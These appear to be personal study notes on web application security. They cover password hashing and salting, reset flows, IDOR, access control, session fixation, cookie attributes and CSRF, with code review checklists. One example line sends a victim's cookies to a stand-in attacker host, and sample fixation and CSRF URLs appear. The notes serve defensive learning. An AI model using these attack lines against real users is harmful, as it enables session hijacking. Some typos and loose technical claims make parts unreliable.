## Password security and Credential Storage  
Improperly stored credentials have been the root cause of some of the largest data breaches in history  
example -- bigbasket, quora leaked my creds  
**Never**  
Never store password in plaintext, compare plaintext passwords  
Never store encrypted passwords -- if key is compromised all passwords are exposed - voilates the principle that passwords should never be recoverable  
Critical principle -- passwords must be hashed(one-way) never encrypted(reversible)  
Never use weak hash functions like md5, sha1, sha256 without salt is insufficient alone - collission attacks possible  
  
**Securing password the right way**  
one way hash functions, unique salt per password, resist brute force, resist GPU attacks  
Modern password hashing algorithms  
1. **bcrypt(industry standard)**
2. **Argon2** -- Modern recommended standard  
3. **scrypt** - alternative modern algorithm
4. **PDKDF2** - widely compatible standard  - uses Sha2 and Sha5 - - more vulner to GPU ttacks than bcrypt/argon2  
input validation  - password length  
hash with bcrypt with random salt  and min 10 iterations   
check if user exsists  
Perform dummy hash comparison to prevent timing attacks  

Acceptable in high to low -- Argon2id, scrypt, bcrypt, PDKDF2  
Insufficient but ok with salt -- Sha256  
not acceptable -- md5, sha1  

**Salt** -- random value added to password before hashing, unique for each password, stored alongside the hash, prevents rainbow table and makes cracking hard/expensive  
using same salt wilL return same hash for same password -- waste of salting  
salting prevents rainbow table attacks  - but does it really matter since hashcat ?   
yea true it can;t stop hashcat but it makes it expensive time taking as each pass becomes unique hash and must be cracked again -  
even same password would have 2 diff hashes and must be cracked to find out...   
and each password with different salt -- random salt is stored alogn with computed passhash - that's how it makes it unique
**Pepper** -- secret value added to password before hasing, same for all passwords, not stored in db stored in config/env, adds defence in depth  
first sha256 of pass with pepper then bcrypt of peppered pass  
Don;t use pepper if you can;t store pepper secret securely - hsm, vault, secrets manager  

**Password reset security**  
predictable reset tokens - based on user data,  reset tokens in url parameters - appears in server logs, browser history, referer, prpxy logs  

****secure reset flow** **  
token generation and sending  
input validation of email/user, rate limiting check, same response whether user exisits/not, generate secure token, hash token before storing, store it with expiration, invalidate any existing reset tokens, store new token, send email with token, log security event, same delay send 200 response message - if mail exisits token is sent.

**Password Policy enforcemnt**  
complete password validation, load common password list, length check, character class requirements, common password check, username is passcheck  
Balance security with usability  - dont expire it every 5 days and ask user to change  
**Red flags during code review** -- plaintext password storage, reversible encryption, weak hash functions, no salt, global/static salt, insufficient rounds 4, timing attack not constant time, password in logs, password/token in url, weak password policy  
**Secure patterns** -- modern algorithms, argon2, constant time comparison, timing attack mitigation with dummy hash, secure token generatio, token exporation, rate limiting

## Authorization and access control flaws  
Authorization vulnerabilities occur when applications fail to properly enforce access controls,  
allowing users to perform actions or access resources they shouldn't.   
While authentication verifies "who you are," authorization determines "what you can do."  

**IDOR** -- Insecure direct object reference -- application exposes a reference to an internal implementation object (database key, filename) without proper authorization checks, allowing users to access resources they shouldn't.  
IDOR types:  
numeric/sequential IDs -- /api/invoice/1 2 ..  
GUId/UUIDs - harder to guess but still vuln if no authoriztion check  
finenames -- /download?file=user1.pdf  
usernames -- /profile?username=admin  

Secure implementation -- authorization check or dont use rreference - /profile retrive users own order pick userid from session  

**Missing function-level access controls**  
When an application doesn't properly restrict access to administrative or privileged functions, allowing regular users to perform actions reserved for administrators.  
**examples** - user can delete any user, can promote anyone to admin, admin panel hidden security by obscurity - sdafs/admin.php  
**Security** -- check authentication, verify user has required role, prevent admin from deleting themselves, admins can view others, regular users can only view themselves  

## Session Management Vulnerabilities  
A session is a server-side data store that maintains state about a user's interaction with web app across multiple HTTP requests.  
Session Components: session ID - unique token, session data - id,lang preferences etc, session cookie, session store - db/memory  

**Session fixation**  
Attacker tricks a user into using a known session ID, then hijacks the session after the user authenticatesSession ID not regenerated after login!  
CRITICAL: Session ID not regenerated after login!  
Attacker sends victim link: https://example.com/?PHPSESSID=ABCD1234  
Victim clicks logs in and attacker uses the same token to takeover account  
Secure code: session_regenerate_id(true); after successful login  

**Secure Session Cookies**:  
**Critical Cookie Attributes**:  
HttpOnly	Prevents JavaScript access (XSS protection)	Set-Cookie: session=abc123; HttpOnly  
Secure	Only send over HTTPS (MitM protection)	Set-Cookie: session=abc123; Secure  
SameSite	CSRF protection	Set-Cookie: session=abc123; SameSite=Strict  
Domain	Restrict cookie scope	Set-Cookie: session=abc123; Domain=example.com  
Path	Restrict cookie path	Set-Cookie: session=abc123; Path=/  
Max-Age/Expires	Cookie lifetime	Set-Cookie: session=abc123; Max-Age=3600  
Attack scenario -- document.location = 'https://attacker.com/steal?cookie=' + document.cookie;  

**Session Hijacking**   
Attacker steals or guesses a valid session ID to impersonate a user.  
Common hijacking methods: xss, MitM, Session sniffing - HTTP, Malware, Session prediction - guess sequence/weak session IDs   

**Security**: on predictable ids, session binding(fingerprinting) to IP/user-agent etc  
inactivity timeout, session expiration timeout - Session expires after fixed time from login  
shorter timeout for sensitive pages - bank pages  

**Cross-Site request forgery(CSRF)**  
Attacker tricks authenticated user into performing unwanted actions on a web application.  
user logs into bank.com-->visits attacker.com htat has link to bank.com/transfer?to=attacker&amount=100, bank.com executes the transfer  
Protection: samesite=lax/strict, CSRF tokens - frameworks provide example csrfprotect() which auto validates token  

Session storage security  
Server memory/filesystem -- fast but medium security  
DB - good and medium performace  
redis/memcached -- very good secure and excellent performance  
Encrypted db -- excellent but medium performance  

**Code review checklist for session management**  
No session regeneration after login  
Insecure cookie attributes  
Predictable session ids  
NO csrf protection on state-changing operations  
session in url  
no session expiration  
no session binding  
weak session secret  
session invalidation on logout
